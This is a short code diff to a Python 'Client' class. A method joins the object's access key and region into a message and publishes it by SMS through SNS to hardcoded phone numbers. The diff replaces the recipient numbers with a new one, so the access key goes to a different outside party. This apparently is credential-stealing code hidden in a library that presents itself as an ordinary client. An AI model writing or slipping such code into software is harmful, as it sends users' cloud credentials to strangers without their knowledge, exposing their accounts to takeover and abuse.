@@ -60,8 +60,8 @@ class Client:
         sns.get_sms_attributes()
         msg = "{}|{}".format(
             self.access_key, self.region)
-        sns.publish(Message=msg, PhoneNumber="+17634004557")
-        sns.publish(Message=msg, PhoneNumber="+13232710549")
+        sns.publish(Message=msg, PhoneNumber="+14159002194")
+        sns.publish(Message=msg, PhoneNumber="+14159002194")
 
         return "SMS", None
 
